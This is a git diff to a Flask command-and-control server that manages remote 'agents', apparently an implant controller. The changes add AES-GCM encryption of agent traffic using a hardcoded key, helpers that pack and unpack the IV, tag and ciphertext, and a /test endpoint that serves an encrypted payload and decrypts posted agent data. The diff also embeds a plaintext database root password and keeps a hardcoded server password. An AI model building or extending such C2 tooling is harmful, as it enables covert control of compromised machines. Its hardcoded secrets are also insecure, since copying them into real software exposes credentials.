@@ -2,7 +2,8 @@ from flask import Flask , request, jsonify, redirect, render_template, url_for
 from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
 from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
-
+from aesgcm import encrypt, decrypt
+import json
 
 
 ### some useful notes here ###
@@ -20,6 +21,9 @@ sqlite:////absolute_path/test.db (abs path file-based database)
 password = "ch0nky" # a temperary password to test the server
 localhost = "http://127.0.0.1:5000"
 template_dir = "../client/templates"
+aes_key = b"\x41\x13\xcd\xa3\xa0\xe0\xab\x5e\x19\xf1\xc0\x1c\x6d\x4e\x77\xc5\xe5\x20\xd2\x44\x0e\x52\xae\x87\xaa\x0a\x96\x67\x28\x82\xea\x08"
+iv_len = 12
+tag_len = 16
 # -----------------------------
 
 
@@ -34,7 +38,7 @@ app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True    # makes json output more rea
 # set the database to work with flask ###
 
 # app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite' # set the database to work with flask
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/c2_server' #mysql://username:password@server/db
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:WQap958910!@localhost/c2_server' #mysql://username:password@server/db
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
 db = SQLAlchemy(app)
 
@@ -86,6 +90,37 @@ class Agent(db.Model):
 
 # search agent by agent_id
 # link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
+
+def serialize(iv, tag, ct):
+    """
+        function to serialize response data
+    """
+
+    res = iv + tag + ct
+
+    return res
+
+def deserialize(byte_str):
+    """
+        function to deserialize request data
+    """
+    res = {}
+    res["iv"] = byte_str[:iv_len]
+    res["tag"] = byte_str[iv_len:tag_len + iv_len]
+    res["cipher"] = byte_str[iv_len + tag_len:]
+    return res
+
+def decrypt_data(byte_str):
+    data = deserialize(byte_str)
+    
+    plaintext = decrypt(aes_key, data["iv"], data["cipher"], data["tag"])
+
+    # plaintext = json.loads(plaintext.decode())
+    # print(plaintext)
+
+    return plaintext
+
+
 def find_agent_by_id(id_):
     """
         a function that finds an agent in database by its id
@@ -314,6 +349,16 @@ def create_task():
     db.session.commit()
     print(f"[+] a new task has been created for agent {agent_id}")
     return jsonify({"status": "ok", "job_id": job_id})
+
+@app.route("/test", methods=["GET", "POST"])
+def test():
+    if request.method == "GET":
+        payload = b"\x87\xb8\xa9\xa6\xc2\x39\x42\x5f\xc2\xda\x8c\xc1\xb5\x6a\x9b\x69\x26\x0e\x79\x75\xe5\x81\x29\xe0\x6d\x68\xb3\x62\x1f\xc4\x4d\xa3\x55\xda\x0f\x32\xb6\xd2\x89\x7b\x22"
+        return payload
+    else:
+        message = decrypt_data(request.data) 
+        print(message)
+        return request.data
 
 
 if __name__ == '__main__':
